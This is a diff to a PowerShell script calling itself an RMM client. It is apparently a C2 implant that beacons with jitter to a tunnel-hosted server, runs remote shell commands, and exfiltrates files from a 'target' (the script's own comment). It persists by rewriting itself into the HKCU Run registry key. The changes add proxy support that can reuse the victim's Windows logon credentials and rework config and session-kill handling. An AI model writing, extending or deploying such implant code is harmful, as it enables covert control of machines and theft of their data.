@@ -1,35 +1,109 @@
 # Enhanced RMM PowerShell Client with Dynamic Configuration
-# Set RMM_BASE_URL in the environment to override (no trailing slash), or edit $u below.
 #
-# HTTP connections (optional):
-#   - Tunnel host is always reached over IPv4: DNS returns only A records; IPv6 literals / IPv6-only DNS are rejected.
-#   - Default: new HttpWebRequest each call, KeepAlive=false (TCP typically closes after each exchange; no shared cookie jar).
-#   - Persistent: CookieContainer + KeepAlive=true (TCP may stay open across requests).
-#   Set $persistentHttp = $true below, or set environment variable RMM_PERSISTENT_HTTP=1 (env wins when set and non-empty).
+# Edit the variables in the configuration block below. Optional environment overrides
+# (RMM_BASE_URL, RMM_BEACON_SECRET, …) are applied immediately after that block.
 
+# -----------------------------------------------------------------------------
+# Configuration — edit these variables
+# -----------------------------------------------------------------------------
+#
+# Server
+#   $u                 RMM server base URL (no trailing slash).
+#   $beaconSecret       Shared beacon token; must match server RMM_BEACON_SECRET.
+#                       Leave empty only if the server runs with --insecure.
+#
+# Session identity
+#   $sessionId          Beacon session GUID (new ID each run unless you set a fixed value).
+#
+# Beacon timing (server may override at runtime via __CONFIG__)
+#   $baseSleepSeconds   Poll interval in seconds.
+#   $jitterPercent      Random +/- percent applied to sleep and backoff.
+#   $maxRetries         Short backoff cycles before a longer pause on errors.
+#
+# HTTP transport
+#   $persistentHttp     $true = reuse TCP + cookies across requests.
+#   $httpProxy           Outbound proxy URI, e.g. http://proxy.corp:8080 (empty = direct).
+#   $httpProxyUseDefaultCredentials
+#                       $true = use Windows logon for proxy authentication (NTLM/Kerberos).
+#
+# Diagnostics
+#   $verboseHttp         $true = log each request URL, wire IPv4, status, and error bodies.
+#
+# HTTP notes (not separate settings):
+#   - Tunnel host is always reached over IPv4 (A records only; no IPv6-only DNS).
+#   - Default transport closes TCP after each request unless $persistentHttp is $true.
+
+$u = 'REPLACE-WITH-YOUR-CLOUDFLARED-URL'
+$beaconSecret = ''
+$sessionId = [System.Guid]::NewGuid().ToString()
+
+$baseSleepSeconds = 60
+$jitterPercent = 30
+$maxRetries = 3
+
+$persistentHttp = $false
+$httpProxy = ''
+$httpProxyUseDefaultCredentials = $false
+
+$verboseHttp = $false
+
+# -----------------------------------------------------------------------------
+# Optional environment overrides (when set, they replace the variables above)
+# -----------------------------------------------------------------------------
 if ($env:RMM_BASE_URL -and $env:RMM_BASE_URL.Trim().Length -gt 0) {
     $u = $env:RMM_BASE_URL.Trim().TrimEnd('/')
-} else {
-    $u = 'REPLACE-WITH-YOUR-CLOUDFLARED-URL'
 }
-if ($u -match 'REPLACE-WITH-YOUR-CLOUDFLARED-URL') {
-    Write-Host "[-] Set the environment variable RMM_BASE_URL to your server base URL (no trailing slash), or edit `$u in this script." -ForegroundColor Red
-    exit 1
-}
-$sessionId = [System.Guid]::NewGuid().ToString()
-$computerName = $env:COMPUTERNAME
-$userName = $env:USERNAME
-
-# Shared secret for beacon endpoints (must match server RMM_BEACON_SECRET).
-$beaconSecret = $null
 if ($env:RMM_BEACON_SECRET -and $env:RMM_BEACON_SECRET.Trim().Length -gt 0) {
     $beaconSecret = $env:RMM_BEACON_SECRET.Trim()
 }
-
-# Verbose HTTP logs: set RMM_VERBOSE=1 (URL, wire IPv4, status codes, error bodies).
-$script:RmmVerbose = $false
 if ($env:RMM_VERBOSE -and $env:RMM_VERBOSE.Trim() -match '^(?i)(1|true|yes|on)$') {
-    $script:RmmVerbose = $true
+    $verboseHttp = $true
+}
+if ($env:RMM_PERSISTENT_HTTP -and $env:RMM_PERSISTENT_HTTP.Trim().Length -gt 0) {
+    $persistentHttp = $env:RMM_PERSISTENT_HTTP.Trim() -match '^(?i)(1|true|yes|on)$'
+}
+if ($env:RMM_HTTP_PROXY -and $env:RMM_HTTP_PROXY.Trim().Length -gt 0) {
+    $httpProxy = $env:RMM_HTTP_PROXY.Trim()
+}
+if ($env:RMM_HTTP_PROXY_USE_DEFAULT_CREDENTIALS -and
+    $env:RMM_HTTP_PROXY_USE_DEFAULT_CREDENTIALS.Trim() -match '^(?i)(1|true|yes|on)$') {
+    $httpProxyUseDefaultCredentials = $true
+}
+
+# -----------------------------------------------------------------------------
+# Derived runtime state (do not edit unless you know why)
+# -----------------------------------------------------------------------------
+if ($u -match 'REPLACE-WITH-YOUR-CLOUDFLARED-URL') {
+    Write-Host "[-] Set `$u in this script or set environment variable RMM_BASE_URL (no trailing slash)." -ForegroundColor Red
+    exit 1
+}
+
+$computerName = $env:COMPUTERNAME
+$userName = $env:USERNAME
+$currentRetry = 0
+$script:RmmEverRegistered = $false
+$script:RmmVerbose = [bool]$verboseHttp
+$script:UsePersistentHttp = [bool]$persistentHttp
+$script:RmmShellCwd = (Get-Location).Path
+
+if ($script:UsePersistentHttp) {
+    $script:RmmCookieContainer = New-Object System.Net.CookieContainer
+} else {
+    $script:RmmCookieContainer = $null
+}
+
+$script:RmmWebProxy = $null
+if ($httpProxy -and $httpProxy.Trim().Length -gt 0) {
+    try {
+        $script:RmmWebProxy = New-Object System.Net.WebProxy ($httpProxy.Trim())
+        $script:RmmWebProxy.BypassProxyOnLocal = $false
+        if ($httpProxyUseDefaultCredentials) {
+            $script:RmmWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
+        }
+    } catch {
+        Write-Host "[-] Invalid `$httpProxy: $httpProxy — $($_.Exception.Message)" -ForegroundColor Red
+        exit 1
+    }
 }
 
 function Write-RmmLog {
@@ -127,32 +201,6 @@ function Get-RmmRequestHeaders {
     return $h
 }
 
-# Remote shell CWD (in memory only; each cmd/pwsh run is otherwise stateless).
-$script:RmmShellCwd = (Get-Location).Path
-
-# Default configuration (will be updated by server)
-$baseSleepSeconds = 60          # Default 1 minute
-$jitterPercent = 30             # Default 30% jitter
-$maxRetries = 3
-$currentRetry = 0
-$script:RmmEverRegistered = $false
-
-# Persistent HTTP: $false = no shared CookieContainer (default). $true = reuse cookies across calls.
-# Env RMM_PERSISTENT_HTTP (1/true/yes/on) overrides this when the variable is set and non-empty.
-$persistentHttp = $false
-
-$script:UsePersistentHttp = $false
-if ($env:RMM_PERSISTENT_HTTP -and $env:RMM_PERSISTENT_HTTP.Trim().Length -gt 0) {
-    $script:UsePersistentHttp = $env:RMM_PERSISTENT_HTTP.Trim() -match '^(?i)(1|true|yes|on)$'
-} else {
-    $script:UsePersistentHttp = $persistentHttp
-}
-if ($script:UsePersistentHttp) {
-    $script:RmmCookieContainer = New-Object System.Net.CookieContainer
-} else {
-    $script:RmmCookieContainer = $null
-}
-
 function Resolve-RmmTunnelIpv4 {
     param([Parameter(Mandatory = $true)][System.Uri]$Uri)
     $hostPart = $Uri.Host
@@ -232,7 +280,8 @@ function Invoke-RmmRestMethod {
     $builder.Host = $resolved.Ipv4.ToString()
     $wireUri = $builder.Uri
 
-    Write-RmmLog "$Method $origUri -> wire $($resolved.Ipv4) Host=$($resolved.OriginalHost) KeepAlive=$($script:UsePersistentHttp)" -Level DEBUG
+    $proxyNote = if ($script:RmmWebProxy) { " Proxy=$httpProxy" } else { '' }
+    Write-RmmLog "$Method $origUri -> wire $($resolved.Ipv4) Host=$($resolved.OriginalHost) KeepAlive=$($script:UsePersistentHttp)$proxyNote" -Level DEBUG
 
     $req = [System.Net.HttpWebRequest]::Create($wireUri)
     $req.Method = $Method
@@ -242,6 +291,9 @@ function Invoke-RmmRestMethod {
     # Default: HTTP keep-alive off so each request tends to close the TCP flow after the exchange (Wireshark-friendly).
     # Persistent mode: keep-alive on so one TCP can carry multiple requests.
     $req.KeepAlive = [bool]$script:UsePersistentHttp
+    if ($script:RmmWebProxy) {
+        $req.Proxy = $script:RmmWebProxy
+    }
     if ($script:UsePersistentHttp -and $script:RmmCookieContainer) {
         $req.CookieContainer = $script:RmmCookieContainer
     }
@@ -689,9 +741,16 @@ function Test-RmmSessionTerminated {
     param($ErrorRecord)
     try {
         $resp = Get-RmmWebExceptionResponse -ErrorRecord $ErrorRecord
-        if (-not $resp -or [int]$resp.StatusCode -ne 403) { return $false }
-        $body = Get-RmmHttpErrorBody -Response $resp
-        return ($body -match 'TERMINATED')
+        if ($resp -and [int]$resp.StatusCode -eq 403) {
+            $body = Get-RmmHttpErrorBody -Response $resp
+            if ($body -match 'TERMINATED') { return $true }
+        }
+        # Invoke-RmmRestMethod reads the error body before throwing; the stream may be empty here.
+        $ex = $ErrorRecord.Exception
+        while ($null -ne $ex) {
+            if ([string]$ex.Message -match 'TERMINATED') { return $true }
+            $ex = $ex.InnerException
+        }
     } catch {}
     return $false
 }
@@ -731,21 +790,26 @@ $registerAttempt = 0
 Write-Host "[*] Starting RMM client with Session ID: $sessionId" -ForegroundColor Cyan
 Write-Host "[*] Server URL: $u" -ForegroundColor Cyan
 if ($beaconSecret) {
-    Write-Host "[*] Beacon token: set (RMM_BEACON_SECRET)" -ForegroundColor Cyan
+    Write-Host "[*] Beacon token: set" -ForegroundColor Cyan
 } else {
     Write-Host "[!] Beacon token: NOT set — server will reject unless started with --insecure" -ForegroundColor Yellow
 }
+if ($script:RmmWebProxy) {
+    $proxyMsg = "[*] HTTP proxy: $httpProxy"
+    if ($httpProxyUseDefaultCredentials) { $proxyMsg += ' (default credentials)' }
+    Write-Host $proxyMsg -ForegroundColor Cyan
+}
 if ($script:RmmVerbose) {
-    Write-Host "[*] Verbose HTTP logging enabled (RMM_VERBOSE=1)" -ForegroundColor DarkGray
+    Write-Host "[*] Verbose HTTP logging enabled" -ForegroundColor DarkGray
 } else {
-    Write-Host "[*] Tip: set RMM_VERBOSE=1 for per-request URL, wire IP, and error bodies" -ForegroundColor DarkGray
+    Write-Host "[*] Tip: set `$verboseHttp = `$true for per-request URL, wire IP, and error bodies" -ForegroundColor DarkGray
 }
 Write-Host "[*] Default beacon: $baseSleepSeconds seconds with $jitterPercent% jitter" -ForegroundColor Cyan
 Write-Host "[*] Connection failures retry indefinitely (only explicit server kill or __EXIT__ stops the client)" -ForegroundColor DarkGray
 if ($script:UsePersistentHttp) {
-    Write-Host "[*] HTTP: persistent cookies + TCP keep-alive. IPv4-only. Clear RMM_PERSISTENT_HTTP / set `$persistentHttp = `$false` for default." -ForegroundColor DarkGray
+    Write-Host "[*] HTTP: persistent cookies + TCP keep-alive, IPv4-only" -ForegroundColor DarkGray
 } else {
-    Write-Host "[*] HTTP: IPv4-only; KeepAlive=false (TCP usually closes after each request). Persistent: `$persistentHttp = `$true` or RMM_PERSISTENT_HTTP=1." -ForegroundColor DarkGray
+    Write-Host "[*] HTTP: IPv4-only, KeepAlive=false (set `$persistentHttp = `$true for persistent TCP)" -ForegroundColor DarkGray
 }
 
 while (-not $registered) {
@@ -771,13 +835,10 @@ while ($true) {
         # Add jitter before each poll cycle
         $actualSleep = Get-JitteredSleep -baseSeconds $baseSleepSeconds -jitterPercent $jitterPercent
 
-        # Re-register each beacon so a restarted server re-creates the session before /cmd.
-        Register-RmmSession -Quiet | Out-Null
-
         $headers = Get-RmmRequestHeaders
         $headers["X-Request-ID"] = [System.Guid]::NewGuid().ToString()
         
-        # Get command from RMM
+        # Poll /cmd before register so a killed session gets __EXIT__ (register returns 403 TERMINATED).
         $cmdUrl = "$u/cmd?id=$sessionId"
         $response = Invoke-RmmRestMethod -Uri $cmdUrl -Method Get -Headers $headers -RestErrorAction Stop
         
@@ -788,6 +849,14 @@ while ($true) {
         $cmdData = Parse-CmdResponse -response $response
         $command = [string]$cmdData.command
         $cmdType = [string]$cmdData.type
+
+        if ($command -eq "__EXIT__") {
+            Write-Host "[*] Session terminated by server; exiting client" -ForegroundColor Yellow
+            exit 0
+        }
+
+        # Re-register each beacon so a restarted server re-creates the session before handling work.
+        Register-RmmSession -Quiet | Out-Null
         
         if ($command -and $command -ne "") {
             if ($command -like "__CONFIG__ *") {
@@ -800,10 +869,6 @@ while ($true) {
             if ($command -eq "__STOP__") {
                 Write-Host "[*] Stopping persistent command" -ForegroundColor Yellow
                 continue
-            }
-            elseif ($command -eq "__EXIT__") {
-                Write-Host "[*] Session terminated by server; exiting client" -ForegroundColor Yellow
-                exit 0
             }
             elseif ($command -like "__DOWNLOAD__ *") {
                 # File download (exfiltrate file from target) — server expects one JSON body: filename + content (base64)
@@ -964,6 +1029,8 @@ while ($true) {
                 $currentScript = $currentScript -replace '(?m)^\s*\$jitterPercent\s*=\s*\d+', ('$jitterPercent = {0}' -f $jitterPercent)
                 $ph = if ($script:UsePersistentHttp) { '$true' } else { '$false' }
                 $currentScript = $currentScript -replace '(?m)^\s*\$persistentHttp\s*=\s*\$(?:true|false)\s*$', ('$persistentHttp = {0}' -f $ph)
+                $proxyEsc = $httpProxy -replace '''', ''''''
+                $currentScript = $currentScript -replace '(?m)^\s*\$httpProxy\s*=\s*.+$', ('$httpProxy = ''{0}''' -f $proxyEsc)
                 Set-Content -LiteralPath $scriptPath -Value $currentScript -Encoding UTF8 -Force
                 
                 $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
@@ -1021,6 +1088,10 @@ while ($true) {
                 continue
             }
         } catch {
+            if (Test-RmmSessionTerminated -ErrorRecord $_) {
+                Write-Host "[*] Session killed on server (TERMINATED); exiting" -ForegroundColor Yellow
+                exit 0
+            }
             Write-RmmHttpFailure -ErrorRecord $_ -Context "re-register"
         }
 
